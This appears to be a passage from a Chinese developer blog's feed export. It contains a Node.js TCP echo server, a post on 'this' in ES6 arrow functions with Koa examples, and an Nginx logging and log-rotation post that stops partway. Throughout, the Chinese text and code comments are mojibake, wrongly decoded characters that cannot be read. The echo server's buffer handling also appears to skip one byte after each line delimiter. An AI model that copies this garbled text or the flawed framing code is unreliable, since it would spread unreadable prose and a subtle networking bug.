class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> net = <span class="built_in">require</span>(<span class="string">&#x27;net&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">7000</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">HOST</span> = <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">LF</span> = <span class="string">&#x27;\n&#x27;</span>.<span class="title function_">charCodeAt</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CR</span> = <span class="string">&#x27;\r&#x27;</span>.<span class="title function_">charCodeAt</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">MAX_LENGTH</span> = <span class="number">128</span>; </span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">STRIP_DELIMITER</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findEndOfLine</span>(<span class="params">buffer</span>) {</span><br><span class="line">    <span class="keyword">let</span> i = buffer.<span class="title function_">indexOf</span>(<span class="variable constant_">LF</span>);</span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; buffer[i - <span class="number">1</span>] === <span class="variable constant_">CR</span>) {</span><br><span class="line">        i--;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fail</span>(<span class="params">socket, length</span>) {</span><br><span class="line">    <span class="keyword">if</span> (socket.<span class="property">writable</span>) {</span><br><span class="line">        socket.<span class="title function_">end</span>(<span class="string">`frame length <span class="subst">${length}</span> exceeds the allowed maximum <span class="subst">${MAX_LENGTH}</span>`</span>);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        socket.<span class="title function_">end</span>();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = net.<span class="title function_">createServer</span>();</span><br><span class="line"><span class="comment">// æœ€å¤§è¿æ¥æ•°</span></span><br><span class="line">server.<span class="property">maxConnections</span> = <span class="number">10240</span>;</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;connection&#x27;</span>, <span class="function">(<span class="params">socket</span>) =&gt;</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`æ–°çš„å®¢æˆ·ç«¯åŠ å…¥ï¼š<span class="subst">${socket.remoteAddress}</span>:<span class="subst">${socket.remotePort}</span>`</span>);</span><br><span class="line">    <span class="comment">// è®¾ç½®ç¼–ç  å¦åˆ™ä¸ºBuffer</span></span><br><span class="line">    <span class="comment">// socket.setEncoding(&#x27;utf8&#x27;);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯ç”¨é•¿è¿æ¥ï¼Œæ¯100æ¯«ç§’æ£€æµ‹ä¸€æ¬¡æ˜¯å¦æ–­å¼€</span></span><br><span class="line">    <span class="comment">// socket.setKeepAlive(true, 100);</span></span><br><span class="line"></span><br><span class="line">    socket.<span class="built_in">setTimeout</span>(<span class="number">5000</span>); <span class="comment">// 5s</span></span><br><span class="line">    socket.<span class="title function_">on</span>(<span class="string">&#x27;timeout&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">        <span class="comment">// timeoutå¹¶ä¸ä¼šæ–­å¼€è¿æ¥ï¼Œéœ€è¦æ‰‹åŠ¨æ–­å¼€</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;è¶…æ—¶æ–­å¼€&#x27;</span>);</span><br><span class="line">        socket.<span class="title function_">end</span>();</span><br><span class="line">    });</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¥æ”¶çš„å­—èŠ‚æ•°é‡ï¼ˆç´¯è®¡ï¼‰</span></span><br><span class="line">    <span class="comment">// socket.bytesRead</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> readBuffer = <span class="title class_">Buffer</span>.<span class="title function_">alloc</span>(<span class="number">0</span>);</span><br><span class="line">    socket.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> {</span><br><span class="line">        readBuffer = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>([readBuffer, data]);</span><br><span class="line">        <span class="keyword">const</span> eol = <span class="title function_">findEndOfLine</span>(readBuffer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (eol &gt;= <span class="number">0</span>) {</span><br><span class="line">            <span class="keyword">let</span> frame;</span><br><span class="line">            <span class="keyword">const</span> delimLength = readBuffer[eol] === <span class="variable constant_">CR</span> ? <span class="number">2</span> : <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">const</span> length = eol + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (length &gt; <span class="variable constant_">MAX_LENGTH</span>) {</span><br><span class="line">                <span class="title function_">fail</span>(socket, length);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable constant_">STRIP_DELIMITER</span>) {</span><br><span class="line">                frame = readBuffer.<span class="title function_">slice</span>(<span class="number">0</span>, eol);</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                frame = readBuffer.<span class="title function_">slice</span>(<span class="number">0</span>, eol + delimLength);</span><br><span class="line">            }</span><br><span class="line">            readBuffer = readBuffer.<span class="title function_">slice</span>(eol + delimLength + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (socket.<span class="property">writable</span>) socket.<span class="title function_">write</span>(frame);</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">const</span> length = readBuffer.<span class="property">length</span>;</span><br><span class="line">            <span class="keyword">if</span> (length &gt; <span class="variable constant_">MAX_LENGTH</span>) {</span><br><span class="line">                <span class="title function_">fail</span>(socket, length);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    });</span><br><span class="line"></span><br><span class="line">    socket.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> {</span><br><span class="line">        <span class="comment">// å½“é”™è¯¯å‘ç”Ÿæ—¶è§¦å‘ã€‚&#x27;close&#x27; äº‹ä»¶ä¹Ÿä¼šç´§æ¥ç€è¯¥äº‹ä»¶è¢«è§¦å‘ã€‚</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`å®¢æˆ·ç«¯é”™è¯¯ï¼š<span class="subst">${err.name}</span>\n<span class="subst">${err.stack}</span>`</span>);</span><br><span class="line">    });</span><br><span class="line"></span><br><span class="line">    socket.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`å®¢æˆ·ç«¯æ–­å¼€ï¼š<span class="subst">${socket.remoteAddress}</span>:<span class="subst">${socket.remotePort}</span>`</span>);</span><br><span class="line">    });</span><br><span class="line"></span><br><span class="line">    socket.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">        <span class="comment">// å®¢æˆ·ç«¯æ–­å¼€FIN</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;FIN&#x27;</span>);</span><br><span class="line">    });</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`æœåŠ¡å™¨é”™è¯¯ï¼š<span class="subst">${err.name}</span>\n<span class="subst">${err.stack}</span>`</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;æœåŠ¡åœæ­¢&#x27;</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;listening&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server listen on <span class="subst">${HOST}</span>:<span class="subst">${PORT}</span>`</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="variable constant_">HOST</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">    server.<span class="title function_">getConnections</span>(<span class="function">(<span class="params">err, connections</span>) =&gt;</span> {</span><br><span class="line">        <span class="keyword">if</span> (!err) {</span><br><span class="line">            <span class="keyword">const</span> now = (<span class="keyword">new</span> <span class="title class_">Date</span>()).<span class="title function_">toUTCString</span>();</span><br><span class="line">            <span class="keyword">const</span> memoryUsage = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(process.<span class="title function_">memoryUsage</span>());</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[<span class="subst">${now}</span>] è¿æ¥æ•°ä¸ºï¼š<span class="subst">${connections}</span>ï¼Œæœ€å¤§è¿æ¥æ•°ä¸ºï¼š<span class="subst">${server.maxConnections}</span>ï¼Œå†…å­˜ä½¿ç”¨ï¼š<span class="subst">${memoryUsage}</span>`</span>);</span><br><span class="line">        }</span><br><span class="line">    });</span><br><span class="line">}, <span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">process.<span class="title function_">on</span>(<span class="string">&#x27;uncaughtException&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`uncaughtExceptionï¼š<span class="subst">${err.name}</span>\n<span class="subst">${err.stack}</span>`</span>);</span><br><span class="line">    process.<span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line">});</span><br></pre></td></tr></table></figure><p>å¯åŠ¨æœåŠ¡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ulimit -n 10240</span><br><span class="line">nohup node echo.js &gt;/var/log/echo.log 2&gt;&amp;1 &amp; </span><br></pre></td></tr></table></figure><p>æµ‹è¯•ä¸€ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet echo.kekek.cc 7000</span><br></pre></td></tr></table></figure><p><a href="https://github.com/tianyk/echo.git">Github</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ES6ç®­å¤´å‡½æ•°ä¸­çš„this</title>
      <link href="/post/arrow-this.html"/>
      <url>/post/arrow-this.html</url>
      
        <content type="html"><![CDATA[<h2 id="ES6ç®­å¤´å‡½æ•°ä¸­çš„this"><a href="#ES6ç®­å¤´å‡½æ•°ä¸­çš„this" class="headerlink" title="ES6ç®­å¤´å‡½æ•°ä¸­çš„this"></a>ES6ç®­å¤´å‡½æ•°ä¸­çš„this</h2><p>ES6 å¼€å§‹å¼•å…¥äº†ç®­å¤´å‡½æ•°ï¼Œè®©ä»£ç çœ‹èµ·æ¥æ›´ç®€æ´äº†ã€‚ä½†æ˜¯ç®­å¤´å‡½æ•°ä¼ ç»Ÿå‡½æ•°ä¸ä»…ä»…æ˜¯å†™æ³•ä¸Šçš„ä¸åŒï¼Œåœ¨<code>this</code>å’Œ<code>arguments</code>çš„å¤„ç†æ–¹å¼ä¹Ÿæœ‰ç€å¾ˆå¤§çš„åŒºåˆ«ã€‚</p><h3 id="thisæ˜¯å±€éƒ¨çš„"><a href="#thisæ˜¯å±€éƒ¨çš„" class="headerlink" title="thisæ˜¯å±€éƒ¨çš„"></a>thisæ˜¯å±€éƒ¨çš„</h3><p>åœ¨ç®­å¤´å‡½æ•°ä¸­<code>this</code>æ˜¯<strong>å±€éƒ¨çš„</strong>ï¼Œå®ƒè·Ÿå…¶å®ƒå±€éƒ¨å˜é‡çš„å¸¸è§„å¤„ç†æ˜¯ä¸€è‡´çš„ã€‚çœ‹ä¸‹é¢çš„ä¾‹å­ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">outer</span> (<span class="params">age</span>) &#123;</span><br><span class="line">    (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>, age);</span><br><span class="line">        &#125;)();</span><br><span class="line">    &#125;)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">outer.<span class="title function_">bind</span>(&#123;<span class="attr">name</span>: <span class="string">&#x27;å°æ˜&#x27;</span>&#125;)(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// =&gt; å°æ˜ 10</span></span><br></pre></td></tr></table></figure><p>è¿™ä¾‹å­ä¸­æˆ‘ä»¬å‡½æ•°å…±æœ‰ä¸‰å±‚åµŒå¥—ï¼Œé‡Œé¢æ˜¯ä¸¤å±‚ç®­å¤´å‡½æ•°ï¼Œè¿™é‡Œæˆ‘ä»¬åœ¨æœ€é‡Œå±‚ç®­å¤´å‡½æ•°å†…éƒ¨å¼•ç”¨äº†<code>this</code>å’Œä¸€ä¸ªå±€éƒ¨å˜é‡<code>age</code>ã€‚å¯¹å±€å±€éƒ¨å˜é‡<code>age</code>çš„æŸ¥æ‰¾è§„åˆ™æˆ‘ä»¬å¾ˆæ¸…æ¥šï¼Œå…ˆåœ¨å½“å‰ä½œç”¨åŸŸæŸ¥æ‰¾ï¼Œå¦‚æœæ²¡æœ‰å°±å»çˆ¶ä½œç”¨åŸŸæŸ¥æ‰¾ï¼Œä¸€ç›´åˆ°æœ€é¡¶å±‚ï¼ˆwindowã€globalï¼‰ã€‚åœ¨ç®­å¤´å‡½æ•°ä¸­å¯¹<code>this</code>çš„æŸ¥æ‰¾è§„åˆ™å’Œ<code>age</code>æ˜¯ä¸€æ ·çš„ï¼Œç®­å¤´å‡½æ•°æœ¬èº«å¹¶æ²¡æœ‰ä¸€ä¸ªè‡ªå·±çš„<code>this</code>ï¼Œå®ƒè¦ä¸€ç›´å¾€ä¸Šå±‚æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°<code>this</code>ä¸ºæ­¢ã€‚</p><p>åŒæ ·ï¼Œå¯¹äº<code>arguments</code>çš„å¤„ç†ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ç®­å¤´å‡½æ•°æœ¬èº«æ˜¯æ²¡æœ‰<code>arguments</code>å˜é‡çš„ã€‚</p><h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><p>ç®­å¤´å‡½æ•°è™½ç„¶å†™èµ·æ¥æ›´åŠ ç®€å•ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸èƒ½ä¸åŠ åŒºåˆ†çš„åœ¨ä»»ä½•åœ°æ–¹éƒ½ç”¨ç®­å¤´å‡½æ•°æ›¿ä»£ä¼ ç»Ÿå‡½æ•°ï¼Œç‰¹åˆ«æ˜¯åœ¨å‡½æ•°å†…éƒ¨æ¶‰åŠ<code>this</code>ç»‘å®šæ—¶ã€‚çœ‹ä¸‹é¢çš„ä¾‹å­ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sayName</span>(<span class="params">fn</span>) &#123;</span><br><span class="line">    fn.<span class="title function_">bind</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;å°æ˜&#x27;</span> &#125;)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">sayName</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;My name is&#x27;</span>, <span class="variable language_">this</span>.<span class="property">name</span>); &#125;);</span><br><span class="line"><span class="comment">// =&gt; My name is å°æ˜</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// é”™è¯¯å†™æ³•</span></span><br><span class="line"><span class="title function_">sayName</span>(<span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;My name is&#x27;</span>, <span class="variable language_">this</span>.<span class="property">name</span>));</span><br><span class="line"><span class="comment">// =&gt; My name is </span></span><br></pre></td></tr></table></figure><p>ä¹Ÿæ­£æ˜¯è¿™ä¸ªåŸå› <a href="https://github.com/koajs/koa/tree/v1.x">Koa 1.x</a>ä¸­æˆ‘ä»¬å¯ä»¥ä¸­é—´ä»¶ä¸­ä½¿ç”¨<code>this</code>å¼•ç”¨åˆ°<code>context</code>ï¼Œè€Œåœ¨<a href="https://github.com/koajs/koa/tree/2.0.0">Koa 2.x</a>ä¸­éœ€è¦å°†<code>context</code>ä½œä¸ºå‚æ•°ä¼ åˆ°ä¸­é—´ä»¶å†…éƒ¨ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// koa1.x</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span> *(next) &#123;</span><br><span class="line">    <span class="keyword">var</span> start = <span class="keyword">new</span> <span class="title class_">Date</span>;</span><br><span class="line">    <span class="keyword">yield</span> next;</span><br><span class="line">    <span class="keyword">var</span> ms = <span class="keyword">new</span> <span class="title class_">Date</span> - start;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;%s %s - %s&#x27;</span>, <span class="variable language_">this</span>.<span class="property">method</span>, <span class="variable language_">this</span>.<span class="property">url</span>, ms);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// koa 2.x</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> start = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">next</span>();</span><br><span class="line">    <span class="keyword">const</span> ms = <span class="title class_">Date</span>.<span class="title function_">now</span>() - start;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;ctx.method&#125;</span> <span class="subst">$&#123;ctx.url&#125;</span> - <span class="subst">$&#123;ms&#125;</span>ms`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://www.cnblogs.com/vajoy/p/4902935.html">ES6 ç®­å¤´å‡½æ•°ä¸­çš„ thisï¼Ÿä½ å¯èƒ½æƒ³å¤šäº†</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> es6 </tag>
            
            <tag> arrow-function </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginxæ—¥å¿—é…ç½®ä¸åˆ‡å‰²</title>
      <link href="/post/nginx-log.html"/>
      <url>/post/nginx-log.html</url>
      
        <content type="html"><![CDATA[<h2 id="Nginxæ—¥å¿—é…ç½®ä¸åˆ‡å‰²"><a href="#Nginxæ—¥å¿—é…ç½®ä¸åˆ‡å‰²" class="headerlink" title="Nginxæ—¥å¿—é…ç½®ä¸åˆ‡å‰²"></a>Nginxæ—¥å¿—é…ç½®ä¸åˆ‡å‰²</h2><p>Nginx æ—¥å¿—é…ç½®éå¸¸ç®€å•ï¼Œé¦–å…ˆä½¿ç”¨<code>log_format</code>æŒ‡ä»¤é…ç½®ä¸€ä¸ªæ ¼å¼ã€‚ç„¶åä½¿ç”¨ <code>access_log</code>ï¼ˆè®¿é—®æ—¥å¿—ï¼‰ã€<code>error_log</code>ï¼ˆé”™è¯¯æ—¥å¿—ï¼‰æŒ‡ä»¤å¼€å¯å³å¯ã€‚</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="comment"># æ—¥å¿—æ ¼å¼ ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ ¼å¼åå­—ï¼Œå¯ä»¥é…ç½®å¤šä¸ªformatï¼ˆè¿™é‡Œçš„æ—¥å¿—æ ¼å¼åä¸º `main`ï¼‰ã€‚åé¢ access_log æŒ‡ä»¤ä½¿ç”¨å“ªä¸ªæ ¼å¼å°±å†™è¿™ä¸ªæ ¼å¼çš„åå­—ã€‚</span></span><br><span class="line">    <span class="attribute">log_format</span> main <span class="string">&#x27;<span class="variable">$remote_addr</span> - <span class="variable">$remote_user</span> [<span class="variable">$time_local</span>] &#x27;</span></span><br><span class="line">                       <span class="string">&#x27;&quot;<span class="variable">$request</span>&quot; <span class="variable">$status</span> <span class="variable">$bytes_sent</span> &#x27;</span></span><br><span class="line">                       <span class="string">&#x27;&quot;<span class="variable">$http_referer</span>&quot; &quot;<span class="variable">$http_user_agent</span>&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">access_log</span> /var/log/nginx/access.log main;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ–è€…æ¯ä¸ªè™šæ‹Ÿä¸»æœºé…ç½®å•ç‹¬çš„æ—¥å¿—æ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">access_log</span> /var/log/nginx/<span class="variable">$host</span>/access.log main;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¡ä»¶æ—¥å¿—"><a href="#æ¡ä»¶æ—¥å¿—" class="headerlink" title="æ¡ä»¶æ—¥å¿—"></a>æ¡ä»¶æ—¥å¿—</h3><p>æˆ‘ä»¬æœ‰ä¸€ä¸ªå¿ƒè·³æ£€æµ‹çš„æœåŠ¡ï¼Œå®šæœŸä¼šå‘æœåŠ¡å™¨å‘è¯·æ±‚ã€‚è¿™ä¸ªè¯·æ±‚æ¯å¤©ä¼šå‘å¾ˆå¤šæ¬¡ï¼Œè¿™ä¸ªè¯·æ±‚çš„æ—¥å¿—ä¹Ÿæ˜¯éå¸¸å¤šçš„ã€‚è¿™ä¸ªæ—¥å¿—æ²¡ä»€ä¹ˆæ„ä¹‰ï¼Œå¯ä»¥æŠŠå®ƒå¿½ç•¥æ‰ã€‚</p><p>ç¬¬ä¸€ç§æ–¹æ³•å°±æ˜¯é…ç½®ä¸€ä¸ªlocationåŒ¹é…åˆ°è¿™ä¸ªå¿ƒè·³æ£€æµ‹æ¥å£å°†æ—¥å¿—å…³æ‰ã€‚</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> = /_heartbeat &#123;</span><br><span class="line">    <span class="attribute">access_log</span> <span class="literal">off</span>;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://myserver;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ–¹æ³•ä¸æ˜¯å¾ˆçµæ´»ï¼Œæˆ‘ä»¬è¦é‡å¤é…ç½®ã€‚æœ‰æ²¡æœ‰åŠæ³•åªé…ç½®ä¸€å¤„å°±èƒ½åšåˆ°å‘¢ï¼ŸæŸ¥çœ‹Nginxæ–‡æ¡£ï¼Œå‘ç°æœ‰ä¸€ä¸ªæ¡ä»¶æ—¥å¿—é…ç½®ç¤ºä¾‹ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">map</span> <span class="variable">$uri</span> <span class="variable">$loggable</span> &#123;</span><br><span class="line">        <span class="comment"># å¯ä»¥ä½¿ç”¨æ­£åˆ™</span></span><br><span class="line">        ~\.(jpg|png|gif|webp)$   0; <span class="comment"># ä¸è®°å½•å›¾ç‰‡</span></span><br><span class="line">        /<span class="attribute">_heartbeat</span>              <span class="number">0</span>; <span class="comment"># ä¸è®°å½•å¿ƒè·³æ£€æµ‹</span></span><br><span class="line">        <span class="attribute">default</span>                  <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">access_log</span> /var/log/nginx/access.log main if=<span class="variable">$loggable</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ—¥å¿—åˆ‡å‰²"><a href="#æ—¥å¿—åˆ‡å‰²" class="headerlink" title="æ—¥å¿—åˆ‡å‰²"></a>æ—¥å¿—åˆ‡å‰²</h3><p>å½“ Nginx æ¥æ”¶åˆ° <code>USR1</code> æ—¶ä¼šé‡æ–°æ‰“å¼€æ—¥å¿—æ–‡ä»¶ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv /var/log/nginx/access.log /var/log/nginx/access.log-20180706</span><br><span class="line">kill -USR1 `cat /var/run/nginx.pid`</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ–¹æ¡ˆå¾ˆä¸çµæ´»ï¼Œéœ€è¦æ‰‹åŠ¨å¤„ç†ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨crontabæˆ–è€…<a href="https://github.com/logrotate/logrotate">logrotate</a>æ¥åšåˆ°è‡ªåŠ¨åŒ–ã€‚</p><ol><li><p>crontab </p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">0 0 * * * æ¯å¤©é›¶ç‚¹æ‰§è¡Œ</span></span><br><span class="line"></span><br><span class="line">LOG_PATH=/var/log/nginx</span><br><span class="line">DATE=`date -d &quot;yesterday&quot; +%Y%m%d`</span><br><span class="line">PID=`cat /var/run/nginx.pid`</span><br><span class="line"></span><br><span class="line">cd $LOG_PATH</span><br><span class="line"></span><br><span class="line">mv access.log access.log-$DATE &amp;&amp; zip -mq access.log-$DATE.zip access.log-$DATE</span><br><span class="line">kill -USR1 $PID</span><br></pre></td></tr></table></figure></li><li><p>logrotate</p> <figure class="highlight 